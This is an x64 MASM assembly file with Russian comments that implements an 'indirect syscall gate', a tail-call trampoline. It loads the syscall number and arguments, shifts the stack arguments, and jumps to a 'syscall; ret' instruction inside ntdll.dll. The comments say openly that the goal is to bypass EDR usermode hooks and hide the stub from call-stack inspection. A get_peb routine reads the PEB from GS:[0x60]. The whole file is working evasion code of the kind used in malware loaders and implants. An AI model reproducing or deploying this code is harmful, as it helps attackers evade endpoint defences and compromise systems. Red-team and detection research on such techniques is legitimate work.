; =============================================================================
; gate.asm
; [STUB] Indirect Syscall Gate — минимальный tail-call трамплин.
;
; Реализует паттерн indirect syscall для обхода EDR usermode hooks:
;   - syscall выполняется НЕ из нашего кода, а из тела ntdll.dll
;   - call stack выглядит чисто: return address указывает на C++ вызывающий код
;   - в call stack нет следов нашего стаба
;
; Архитектура: True Tail Call (хвостовой вызов).
;   - Без пролога: НЕ сохраняем регистры (мы не возвращаемся сюда)
;   - Без эпилога: JMP передаёт управление в ntdll, а ret внутри ntdll
;     снимает return address, положенный C++ кодом, и возвращается
;     напрямую в C++ вызывающую функцию
;
; Прототип (C++):
;   extern "C" uint64_t indirect_syscall(
;       uint32_t ssn,            ; ECX  -> EAX  (SSN)
;       uint64_t syscall_addr,   ; RDX  -> R11  (адрес JMP)
;       uint64_t arg1,           ; R8   -> R10  (1-й аргумент Nt*)
;       uint64_t arg2,           ; R9   -> RDX  (2-й аргумент Nt*)
;       uint64_t arg3,           ; [RSP+28h] -> R8  (3-й)
;       uint64_t arg4,           ; [RSP+30h] -> R9  (4-й)
;       uint64_t arg5,           ; [RSP+38h] -> [RSP+28h] (5-й, на стеке для ядра)
;       uint64_t arg6,           ; [RSP+40h] -> [RSP+30h] (6-й, на стеке для ядра)
;       ...
;   );
;
; Возвращает: NTSTATUS в RAX (возврат из ntdll -> напрямую в C++ caller).
;
; Математика стека:
;   На входе RSP указывает на return address (к C++ коду).
;   Мы НЕ модифицируем RSP (ни push, ни sub).
;   Стек (от C++ ABI):
;     [RSP+00h] = return address
;     [RSP+08h] = shadow[0] (RCX)
;     [RSP+10h] = shadow[1] (RDX)
;     [RSP+18h] = shadow[2] (R8)
;     [RSP+20h] = shadow[3] (R9)
;     [RSP+28h] = arg3 (5-й C++ param)
;     [RSP+30h] = arg4 (6-й C++ param)
;     [RSP+38h] = arg5 (7-й C++ param)
;     [RSP+40h] = arg6 (8-й C++ param)
;
;   После перекладки arg3/arg4 в R8/R9, ядро ожидает 5-й+ Nt-параметр
;   по адресу [RSP+28h]. Но arg5 лежит на [RSP+38h] (смещён на 0x10).
;   Поэтому мы сдвигаем стековые аргументы вниз на 0x10 перед JMP.
; =============================================================================

.code

; -----------------------------------------------------------------------------
; indirect_syscall — безпрологовый tail-call трамплин со сдвигом стека
; -----------------------------------------------------------------------------
indirect_syscall PROC

    ; Шаг 1: Извлекаем SSN и адрес прыжка
    mov     eax, ecx            ; EAX = System Service Number (RCX больше не нужен)
    mov     r11, rdx            ; R11 = адрес `syscall; ret` (volatile, безопасно)

    ; Шаг 2: Перекладываем аргументы в syscall-регистры
    mov     r10, r8             ; R10 = arg1 (syscall ABI: R10 заменяет RCX)
    mov     rdx, r9             ; RDX = arg2
    mov     r8,  [rsp + 28h]    ; R8  = arg3
    mov     r9,  [rsp + 30h]    ; R9  = arg4

    ; Шаг 3: Сдвиг стековых аргументов 5+ вниз на 0x10
    ;
    ;   arg3/arg4 уже прочитаны в R8/R9, их стековые ячейки свободны.
    ;   Ядро Windows при syscall читает 5-й+ Nt-параметр с [user_RSP+28h].
    ;   arg5 сейчас на [RSP+38h] — сдвигаем на [RSP+28h], и т.д.
    ;   RCX свободен (SSN уже в EAX), используем как временный регистр.
    mov     rcx, [rsp + 38h]    ; arg5
    mov     [rsp + 28h], rcx
    mov     rcx, [rsp + 40h]    ; arg6
    mov     [rsp + 30h], rcx
    mov     rcx, [rsp + 48h]    ; arg7 (запас для NtAllocateVirtualMemory и т.д.)
    mov     [rsp + 38h], rcx

    ; Шаг 4: Tail-call — JMP на `syscall; ret` внутри ntdll.dll
    ;
    ; Поток исполнения:
    ;   1. JMP r11       -> переход в ntdll (без push return address)
    ;   2. syscall       -> ядро (EAX=SSN, R10=arg1, RDX=arg2, R8=arg3, R9=arg4)
    ;                       ядро читает arg5+ с [user_RSP+28h] — мы сдвинули туда!
    ;   3. ret           -> ntdll снимает [RSP] = return address C++ caller
    ;   4. Управление в C++ коде, RAX = NTSTATUS
    jmp     r11

indirect_syscall ENDP

; -----------------------------------------------------------------------------
; get_peb — читает PEB из GS:[0x60] (x64)
; Возвращает: указатель на PEB в RAX.
; -----------------------------------------------------------------------------
get_peb PROC
    mov     rax, gs:[60h]
    ret
get_peb ENDP

END
